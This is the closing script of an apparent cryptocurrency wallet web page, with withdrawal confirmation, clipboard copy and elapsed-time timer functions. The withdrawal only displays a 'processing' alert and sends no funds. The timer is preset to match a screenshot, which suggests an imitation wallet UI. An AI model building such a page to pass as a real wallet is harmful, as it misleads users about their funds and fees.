                `Withdrawal Details:\n\n` +
                `Amount: ${amount} ${coin}\n` +
                `To: ${address}\n` +
                `Network Fee: $${CONFIG.withdrawalFeeUSD} (${ethRequired.toFixed(8)} ETH)\n\n` +
                `Confirm withdrawal?`
            );
            
            if (confirmation) {
                alert(`Withdrawal processing...\n${amount} ${coin} will be sent to ${address}\n${ethRequired.toFixed(8)} ETH will be deducted for fees.`);
                closeModal('withdrawModal');
            }
        }

        // COPY TO CLIPBOARD
        function copyToClipboard(elementId) {
            const text = document.getElementById(elementId) ? 
                document.getElementById(elementId).innerText : 
                CONFIG.ethAddress;
            
            navigator.clipboard.writeText(text).then(() => {
                const btn = event.target.closest('button');
                const original = btn.innerHTML;
                btn.innerHTML = '<i class="fas fa-check"></i> Copied!';
                btn.style.background = 'var(--green)';
                setTimeout(() => {
                    btn.innerHTML = original;
                    btn.style.background = '';
                }, 2000);
            });
        }

        // TIMER
        function startTimer() {
            let mins = 411; // Matches the screenshot provided
            setInterval(() => {
                mins++;
                document.getElementById('timeElapsed').innerText = `${mins} mins ago`;
            }, 60000);
        }

    </script>
</body>
</html>
